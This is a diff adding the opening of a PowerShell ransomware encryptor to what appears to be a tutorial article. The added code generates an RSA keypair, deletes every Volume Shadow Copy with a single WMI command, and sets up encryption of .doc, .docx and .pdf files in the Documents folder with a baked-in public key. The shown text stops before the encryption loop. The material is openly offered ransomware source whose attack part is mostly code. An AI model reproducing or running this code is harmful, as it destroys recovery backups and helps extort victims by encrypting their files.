@@ -101,3 +101,35 @@ When the attacker wants to decrypt, the only thing they need to do is supply the
 Let's code it!
 
 ## Coding the encryptor
+While I dislike `PowerShell`, I will use it since it's pre-installed on every modern Windows OS box.  
+The first thing we'll have to do is generate an `RSA keypair` - i.e. a `public key` and a `private key`. We will save the public and private keys into `xml` files:
+
+```powershell
+$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048
+$pubkey = $rsa.ToXmlString($false)
+$pubkey | Out-File "public-key.xml"
+$rsa.toXmlString($true) | Out-File "private-key.xml"
+```
+
+There's nothing sophisticated here - first line creates an `RSA` "instance" with a key size of 2048 bits. This already generates the `keypair`. Then, we simply output the public key and private key to `xml` files.  
+Now, let's move to the juicy part - the encryptor.  
+The first thing I'd do is deleting all [Volume Shadow Copies](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) - that's a common technique for Ransomware, and I'd like to stay true to the purpose:
+
+```powershell
+Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+```
+
+At this point - we can start the encryption part:
+```powershell
+$public_key_xml = "INSERT RSA PUBLIC KEY XML HERE"
+$extensions = ".doc,docx,.pdf"
+$base_folder = [Environment]::GetFolderPath("MyDocuments")
+$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider
+$rsa.FromXmlString($public_key_xml)
+$extensions = $extensions.Split(",") | % {"*" + $_.Trim()}
+```
+
+- The `public key` is "baked-in" and saved in the `$public_key_xml` variable.
+- The set of file extensions is saved in the `$extensions` variable.
+- We will look for all files under the `$base_folder`, which is my case is the "Documents" folder, but you can do whatever you like.
+- We create a new `RSA` instance (`$rsa`) and import the `public key` into that instance.
